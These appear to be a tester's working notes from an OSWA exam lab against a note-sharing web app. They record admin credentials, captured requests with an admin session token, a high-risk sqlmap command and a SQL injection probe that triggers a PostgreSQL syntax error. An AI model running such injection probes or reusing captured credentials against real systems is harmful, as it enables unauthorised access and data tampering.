# Start here
starting page after logging in with `administrator:adminxss`
- able to `delete` or `approve` notes
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic26.png]]
also able to `lock` or look at notes of `users`
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic27.png]]
## Deleting Users
burp request of deleting users
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic28.png]]
post request for `sql`
```bash
POST /api/admin/note/delete?noteId=e23ff7e1-0925-420c-aa9f-e562f81e63bc HTTP/1.1
Host: 192.168.62.62:8443
Cookie: sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6InRydWUiLCJleHAiOjE3NTgzMjkyOTYsInVzZXJJZCI6IjM5YmNjMDEwLTE5NWEtNGM0Mi1hNmM4LWE2YmRjYjI0NmU5YyIsInVzZXJuYW1lIjoiYWRtaW5pc3RyYXRvciJ9.855q7o-lOgqbTCApebC5kqyXuOluRC5OIDMo5MLZ2uU
Content-Length: 0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Origin: http://192.168.62.62
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Sec-Fetch-Storage-Access: active
Referer: http://192.168.62.62/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
```
## Approving Users
burp request of approving users
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic29.png]]
## Locking Users
locking out`jen7` user
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic30.png]]
unlocking user 
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic31.png]]

## Viewing Notes
burp of `viewing` notes
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic32.png]]

# SQL Testing
testing all post requests above

don't believe `sqlmap`will work, but can specify db now with is `postgresql`
```bash
sqlmap -r delete_post.txt --batch --risk=3 --level=5
```
got an `sql` error when utilizing `''` two backticks
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-PSQL-identification-pic33.png]]

```bash
'''-SELECT+current_user
```

![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic34.png]]
error i am receiving
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic35.png]]

```bash
{"status": "error", "message":"An error occurred. StatementCallback; bad SQL grammar [DELETE FROM notes WHERE id = '--b079a6c0-fcd2-43b1-8feb-2147fac1eb0e'''-SELECT current_user';]; nested exception is org.postgresql.util.PSQLException: Unterminated string literal started at position 91 in SQL DELETE FROM notes WHERE id = '--b079a6c0-fcd2-43b1-8feb-2147fac1eb0e'''-SELECT current_user';. Expected  char"}
```